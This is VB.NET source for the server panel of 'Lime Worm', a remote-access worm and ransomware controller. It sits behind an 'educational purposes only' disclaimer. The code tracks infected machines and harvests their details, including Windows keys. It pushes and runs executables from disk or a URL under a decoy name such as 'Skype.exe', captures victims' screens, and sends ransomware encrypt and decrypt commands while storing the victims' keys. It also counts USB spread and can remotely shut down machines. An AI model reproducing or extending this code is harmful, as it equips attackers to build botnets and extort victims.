
'##################################################################
'##        N Y A N   C A T  |||   Updated on MAR./18/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                     .. Lime Worm v0.4.1 ..                   ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################




Public Class Form1
    Public WithEvents S As Listner
    Public SPL As String = "|'L'|"
    Private m_SortingColumn As ColumnHeader
    Public Shared F As Form1
    Public Shared MYPORT As Integer



#Region "Form Events"


    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        NotifyIcon1.Dispose()
        Application.Exit()
        End
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
        Control.CheckForIllegalCrossThreadCalls = False

        Try
            MYPORT = InputBox("Hello " + Environment.UserName + " , Select Port", "", My.Settings.port)
            If Not MYPORT = Nothing Then
                S = New Listner(MYPORT)
                My.Settings.port = MYPORT
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try

        Me.Text = "Lime Worm v0.4.1E"

        Try
            If Not IO.Directory.Exists(Application.StartupPath + "\" + "Wallpaper") Then
                IO.Directory.CreateDirectory(Application.StartupPath + "\" + "Wallpaper")
            End If
            Threading.Thread.CurrentThread.Sleep(10)
            If Not IO.Directory.Exists(Application.StartupPath + "\" + "Stub") Then
                IO.Directory.CreateDirectory(Application.StartupPath + "\" + "Stub")
            End If
            Threading.Thread.CurrentThread.Sleep(10)
            If Not IO.File.Exists(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg") Then
                My.Resources.Lime_s_wallpaper.Save(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg", Imaging.ImageFormat.Jpeg)
            End If
        Catch ex As Exception

        End Try

    End Sub
#End Region


#Region "Server Events"
    Private Sub S_Disconnected(ByVal u As USER) Handles S.Disconnected
        SyncLock L1.Items
            Try
                L1.Items(u.IP).Remove()
                Messages("{" + u.IP.Split(":")(0) + "}", "Disconnected")
            Catch ex As Exception
            End Try
        End SyncLock
    End Sub

    Private Sub S_Connected(ByVal u As USER) Handles S.Connected
        Messages("{" + u.IP.Split(":")(0) + "}", "Connected")
    End Sub

    Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
    Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
        Dim A As String() = Split(BS(b), SPL)
        Try
            Select Case A(0)
                Case "info" ' Client Sent me PC name
                    SyncLock L1.Items
                        u.L = L1.Items.Add(u.IP, "", 0)
                        u.L.Tag = u
                        u.L.Text = A(1)
                        u.L.SubItems.Add(u.IP.Split(":")(0))
                        For i As Integer = 2 To A.Length - 1
                            u.L.SubItems.Add(A(i))
                        Next

                        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(0).Text, Nothing) IsNot Nothing Then
                            u.L.ForeColor = ColorTranslator.FromHtml(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(0).Text, Nothing))
                        End If

                        Fix()
                    End SyncLock

                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                    NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP
                    NotifyIcon1.BalloonTipTitle = "Lime Worm | New Connection!"
                    NotifyIcon1.ShowBalloonTip(600)

                Case "ping" ' ping
                    SyncLock L1.Items
                        u.IsPinged = False
                        u.L.SubItems(PING.Index).Text = u.MS & "ms"
                        u.MS = 0
                    End SyncLock

                Case "!R"
                    SyncLock L1.Items
                        L1.Items(u.IP).SubItems(Rans.Index).Text = A(1).ToString
                    End SyncLock
                    Fix()

                Case "!U"
                    SyncLock L1.Items
                        If A(1).ToString.Contains("Spreaded!") Then
                            L1.Items(u.IP).BackColor = Color.DarkGreen
                            L1.Items(u.IP).SubItems(USB.Index).Text = "Just Spreaded!"
                        Else
                            L1.Items(u.IP).SubItems(USB.Index).Text = A(1).ToString
                        End If
                    End SyncLock
                    Fix()

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)

                    If Cap Is Nothing Then
                        Cap = New Cap
                        Cap.F = Me
                        Cap.u = u
                        Cap.Name = "!" + u.IP
                        Cap.Sz = New Size(A(1), A(2))
                        Cap.Show()
                    End If

                Case "@" ' i recive image  

                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)
                    If Cap IsNot Nothing Then
                        If A(1).Length = 1 Then
                            Cap.Text = u.IP + " Size: " & siz(b.Length) & " ,No Changes"
                            If Cap.Button1.Text = "Stop" Then
                                S.Send(u, "@" & SPL & Cap.C1.SelectedIndex & SPL & Cap.C2.Text & SPL & Cap.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(b, "@" & SPL)(1)
                        Cap.PktToImage(BB)
                    End If

                Case "Details"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim D As Details = My.Application.OpenForms("D" + u.IP)
                    If D Is Nothing Then
                        D = New Details
                        D.F = Me
                        D.U = u
                        D.Name = "D" + u.IP
                        D.Text = "Details " + u.IP.Split(":")(0)
                        D.Show()
                    End If

                    D.ListView1.Items.Clear()

                    D.ListView1.Columns.Add("")
                    D.ListView1.Columns.Add("")

                    D.ListView1.Items.Add("ID ").SubItems.Add(A(1))
                    D.ListView1.Items.Add("User ").SubItems.Add(A(2))
                    D.ListView1.Items.Add("Windows Name ").SubItems.Add(A(12))
                    D.ListView1.Items.Add("Windows Key ").SubItems.Add(A(13))
                    D.ListView1.Items.Add("Connection ").SubItems.Add(A(11))
                    D.ListView1.Items.Add("Stub ").SubItems.Add(A(3))
                    D.ListView1.Items.Add("CPU ").SubItems.Add(A(4))
                    D.ListView1.Items.Add("GPU ").SubItems.Add(A(5))
                    D.ListView1.Items.Add("Privilege ").SubItems.Add(A(6))
                    D.ListView1.Items.Add("Machine Type ").SubItems.Add(A(7))
                    D.ListView1.Items.Add("Current Time ").SubItems.Add(A(8))
                    D.ListView1.Items.Add("Drivers List ").SubItems.Add(A(9))
                    D.ListView1.Items.Add("Last reboot ").SubItems.Add(A(10))
                    D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

                Case "MSG"
                    Messages("{" + u.IP.Split(":")(0) + "}", A(1).ToString)

                Case "Key"

                    If Not IO.Directory.Exists("Users" + "\" + A(1).ToString) Then
                        IO.Directory.CreateDirectory("Users" + "\" + A(1).ToString)
                    End If
                    IO.File.WriteAllText("Users" + "\" + A(1).ToString + "\" + "KEY.txt", A(2))

                Case "DEL-KEY"
                    IO.File.Delete("Users" + "\" + A(1).ToString + "\" + "KEY.txt")

                Case "SC"
                    IO.File.WriteAllBytes("Users" + "\" + A(1).ToString + "\" + "SC.jpeg", Convert.FromBase64String(A(2)))
            End Select
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub
#End Region


#Region "Logs"

    Public Sub Messages(ByVal user As String, ByVal msg As String)
        L2.Items.Add("[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
    End Sub

    Private Sub ListBox1_DrawItem(sender As System.Object, e As System.Windows.Forms.DrawItemEventArgs) Handles L2.DrawItem
        e.DrawBackground()

        If L2.Items(e.Index).ToString.Contains("Connected") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Lime, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.DarkRed, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Red, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

        ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.LightSteelBlue, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
        Else
            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.White, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
        End If
        e.DrawFocusRectangle()
    End Sub

    Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
        L2.ClearSelected()
        MAIN_TAB.Focus()
    End Sub
#End Region


#Region "Worm Options"


    Private Sub DiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE & SPL & "update")
            Next
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Reconnect")
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Close")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Uninstall")
        Next
    End Sub

#End Region


#Region "Theme"

    Private Sub Fix()
        On Error Resume Next
        Me.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub Form1_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        Fix()
        PictureBox1.Anchor = (AnchorStyles.Bottom + AnchorStyles.Right)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            ToolStripStatusLabel1.Text = "LISTENING PORT [" & MYPORT & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
        Catch ex As Exception
        End Try
    End Sub

    Public Function KeyCount()
        Try
            If Not IO.Directory.Exists("Users") Then
                IO.Directory.CreateDirectory("Users")
            End If

            Dim fileCount As Integer = IO.Directory.GetFiles("Users", "KEY.txt", IO.SearchOption.AllDirectories).Length
            Return fileCount
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Public Function SpreadCount()
        Try
            Dim count As Integer = 0
            For Each x As ListViewItem In L1.Items
                If x.SubItems(USB.Index).Text.Contains("Spreaded!") Then
                    count += 1
                End If
            Next
            Return count
        Catch ex As Exception
            Return "0"
        End Try
    End Function


    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        Try
            If L1.SelectedItems.Count > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    PictureBox1.ImageLocation = "Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(0).Text + "\" + "SC.jpeg"
                    PictureBox1.Visible = True
                Next
            Else
                PictureBox1.Visible = False
            End If
        Catch ex As Exception
            PictureBox1.Visible = False
        End Try
    End Sub

    Private Sub L1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Using br = New Drawing.SolidBrush(Drawing.Color.Black)
            e.DrawBackground()
            e.Graphics.FillRectangle(br, e.Bounds)
            Dim headerFont As New Drawing.Font("Microsoft Sans Serif", 8, Drawing.FontStyle.Bold)
            e.Graphics.DrawString(e.Header.Text, headerFont, Drawing.Brushes.Lime, e.Bounds)
        End Using
    End Sub

    Private Sub L1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        e.DrawDefault = True
        If (e.ItemIndex Mod 2) = 1 Then
            e.Item.BackColor = Drawing.Color.Black
            e.Item.UseItemStyleForSubItems = True
        End If
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        On Error Resume Next
        ' Get the new sorting column.
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        ' Figure out the new sorting order.
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            ' New column. Sort ascending.
            sort_order = SortOrder.Ascending
        Else
            ' See if this is the same column.
            If new_sorting_column.Equals(m_SortingColumn) Then
                ' Same column. Switch the sort order.
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending.
                sort_order = SortOrder.Ascending
            End If

            ' Remove the old sort indicator.
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        ' Display the new sort order.
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        ' Create a comparer.
        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        ' Sort.
        L1.Sort()
        Fix()
    End Sub
#End Region


#Region "Commands"

    Private Sub RemoteDesktopToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "!")
        Next
    End Sub

    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE)
            Next
        End If
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Title = "RUN"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        Builder.Show()
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Dim R As New Ransomware
        R.ShowDialog()

        If R.OK = True Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "ENC" & SPL & R.RichTextBox1.Text & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation)))
            Next
        End If
    End Sub

    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "DEC" & SPL & IO.File.ReadAllText("Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(0).Text + "\" + "KEY.txt"))
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Details")
        Next
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("Coded by NYAN CAT" + vbNewLine + vbNewLine + "NYANxCAT@protonmail.com" + vbNewLine, MsgBoxStyle.Information, Title:=" Lime Worm | About ")
    End Sub

    Private Sub BotColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BotColorToolStripMenuItem.Click
        Dim cDialog As New ColorDialog

        If (cDialog.ShowDialog() = DialogResult.OK) Then
            For Each x As ListViewItem In L1.SelectedItems
                x.ForeColor = cDialog.Color
                Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
                My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", x.SubItems(0).Text, CCC)
            Next
        End If
    End Sub


    Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-RES")
        Next
    End Sub

    Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-SHUT")
        Next
    End Sub

    Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-OUT")
        Next
    End Sub




#End Region


End Class